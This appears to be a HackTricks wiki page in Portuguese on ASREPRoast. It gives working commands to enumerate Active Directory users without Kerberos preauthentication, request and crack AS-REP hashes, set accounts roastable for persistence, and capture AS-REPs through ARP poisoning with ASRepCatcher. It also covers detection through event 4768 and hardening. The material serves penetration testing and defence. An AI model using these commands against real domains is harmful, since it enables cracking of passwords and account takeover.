# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast é um ataque de segurança que explora usuários que não têm o **atributo Kerberos pre-authentication required**. Basicamente, essa vulnerabilidade permite que atacantes solicitem a autenticação de um usuário ao Domain Controller (DC) sem precisar da senha do usuário. O DC responde com uma mensagem criptografada com uma chave derivada da senha do usuário, que os atacantes podem tentar quebrar offline para descobrir a senha.

Os principais requisitos para esse ataque são:

- **Ausência de pré-autenticação Kerberos**: os usuários-alvo não devem ter esse recurso de segurança habilitado.
- **Conexão com o Domain Controller (DC)**: os atacantes precisam ter acesso ao DC para enviar solicitações e receber mensagens criptografadas.
- **Conta de domínio opcional**: ter uma conta de domínio permite que os atacantes identifiquem usuários vulneráveis com mais eficiência por meio de consultas LDAP. Sem uma conta, os atacantes precisam adivinhar nomes de usuário.

#### Enumerando usuários vulneráveis (são necessárias credenciais de domínio)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Solicitação da mensagem AS_REP

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus solicita **RC4** por padrão, então o Event ID **4768** geralmente mostra **preauth type 0** e **ticket encryption type 0x17**. Se você adicionar **`/aes`** (ou se RC4 estiver desativado para o alvo), espere **AES etypes**.<sup>[[2]](#references)</sup>

#### Comandos rápidos de uma linha (Linux)

- Enumere primeiro possíveis alvos (por exemplo, a partir de leaked build paths) com Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Faça roast de uma lista completa de nomes de usuário sem credenciais válidas usando NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Se você tiver credenciais, deixe o NetExec consultar o LDAP e solicitar todas as contas roastable: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Se a saída começar com **`$krb5asrep$23$`**, quebre-a com Hashcat **`-m 18200`**. Se começar com **`$krb5asrep$17$`** ou **`$krb5asrep$18$`**, prefira John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Não presuma que todo AS-REP roast usa RC4. Ferramentas modernas podem retornar **RC4** (`$krb5asrep$23$`) ou **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), dependendo do enctype solicitado/negociado. **`hashcat -m 18200`** é para **etype 23**, enquanto **John** lida diretamente com `krb5asrep` para **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Persistência

Force que a **preauth** não seja exigida para um usuário para o qual você tenha permissões **GenericAll** (ou permissões para gravar propriedades):

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Detecção e hardening

Uma **solicitação AS-REP sem preautenticação** bem-sucedida gera um evento **4768** no DC com `Status=0x0` e `PreAuthType=0`; isso registra uma solicitação, não prova que alguém quebrou a resposta ou comprometeu a conta. Não exija RC4 na detecção: `TicketEncryptionType=0x17` é um sinal útil de criptografia fraca, mas um atacante pode solicitar AES (valores do log de eventos `0x11`/`0x12`). No Windows Server 2016 e versões posteriores com a atualização cumulativa de 14 de janeiro de 2025 (ou mais recente), a versão 2 do evento 4768 também expõe `ClientAdvertizedEncryptionTypes`, os etypes suportados pela conta/DC e as chaves disponíveis.<sup>[[5]](#references)</sup>

Uma busca prática sinaliza um cliente que anuncia apenas RC4 enquanto a conta tem chaves AES e, em seguida, correlaciona rajadas de solicitações vindas de um único IP de origem contra vários usuários sem preautenticação. Defina uma baseline para exceções legítimas em vez de alertar sobre todo evento com `PreAuthType=0`.

Para atribuição, normalize o campo `IpAddress` (que pode conter IPv4 mapeado como `::ffff:`) e compare a janela de tempo com eventos 4769 de tíquetes de serviço ou eventos 5140 de acesso a compartilhamentos. Esses eventos podem identificar contas ativas no mesmo endereço, mas uma solicitação AS-REP sem preautenticação não exige uma conta autenticada. Hosts compartilhados, NAT, proxies e várias sessões significam que corresponder um IP **não** identifica a pessoa ou a conta que enviou o AS-REQ. Trate as contas relacionadas como pistas de investigação e confirme com evidências de endpoint ou de rede.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

A correção duradoura é desmarcar **Não exigir preautenticação Kerberos** em todos os usuários que não precisem estritamente disso e trocar as senhas das contas expostas. Se não for possível remover uma exceção, use uma senha longa gerada aleatoriamente e privilégios mínimos. Desativar RC4 aumenta o custo de cracking, mas não elimina a possibilidade de roast, pois as respostas AS-REP com AES continuam vulneráveis a cracking offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast sem credenciais

Um atacante on-path pode capturar o AS-REP retornado durante uma troca AS normal, com preautenticação, e formatar sua parte criptografada para cracking offline. Diferentemente do ASREPRoasting clássico, isso não exige `DONT_REQ_PREAUTH`; no entanto, só revela contas cuja troca Kerberos seja efetivamente interceptada. **ASRepCatcher** obtém essa posição usando poisoning ARP unidirecional por padrão ou pode consumir tráfego de outra técnica MitM com `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Se você quiser o truque relacionado sem credenciais que retorna um **tíquete de serviço** em vez de um **TGT** de um principal sem preautenticação, consulte [Kerberoast](kerberoast.md).

No modo `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) encaminha AS-REQs interceptados e força **RC4** quando ambos os lados ainda o permitem. `listen` não altera os pacotes e, portanto, captura o enctype negociado pelo cliente e pelo DC. Sempre que possível, limite o poisoning com `-t`/`-tf` em vez de afetar toda a sub-rede.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Evento 4768: um ticket de autenticação Kerberos foi solicitado](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Evento de segurança 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Evento de segurança 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
